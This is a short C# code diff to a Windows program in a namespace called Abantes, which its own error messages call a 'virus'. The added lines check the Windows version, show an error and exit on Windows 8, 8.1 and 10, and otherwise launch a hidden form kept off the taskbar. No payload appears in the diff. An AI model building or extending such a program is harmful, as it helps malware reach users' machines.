@@ -17,6 +17,42 @@ namespace Abantes
         {
             SetProcessDPIAware();
 
+            OperatingSystem os = Environment.OSVersion;
+            Version vs = os.Version;
+            string operatingSystem = "";
+            if (os.Platform == PlatformID.Win32NT)
+            {
+                switch (vs.Major)
+                {
+                    case 6:
+                        if (vs.Minor == 2)
+                            operatingSystem = "8";
+                        else if (vs.Minor == 3)
+                            operatingSystem = "8.1";
+                        break;
+                    case 10:
+                        operatingSystem = "10";
+                        break;
+                    default:
+                        break;
+                }
+            }
+            if (operatingSystem == "10")
+            {
+                MessageBox.Show("This Virus Dosen't Work On Windows 10", "Error", 0, MessageBoxIcon.Error);
+                Environment.Exit(0);
+            }
+            else if (operatingSystem == "8")
+            {
+                MessageBox.Show("This Virus Dosen't Work On Windows 8.x", "Error", 0, MessageBoxIcon.Error);
+                Environment.Exit(0);
+            }
+            else if (operatingSystem == "8.1")
+            {
+                MessageBox.Show("This Virus Dosen't Work On Windows 8.x", "Error", 0, MessageBoxIcon.Error);
+                Environment.Exit(0);
+            }
+
             Form f = new MainThread();
             f.FormBorderStyle = FormBorderStyle.FixedToolWindow;
             f.ShowInTaskbar = false;
